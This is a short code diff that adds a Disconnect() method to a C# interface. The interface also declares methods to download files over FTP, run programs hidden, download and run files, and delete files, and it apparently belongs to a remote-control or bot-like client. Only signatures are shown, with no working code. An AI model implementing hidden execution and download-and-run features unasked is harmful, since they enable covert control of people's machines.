@@ -14,6 +14,7 @@ namespace Interfaces.Users
         void DownloadFloader(string ftpPath, string localPath);
         void DownloadUpdate();
         void Reconnect();
+        void Disconnect();
         void RunHideProgram(string file);
         void DownloadAndRun(string file);
         void DeleteFile(string file);
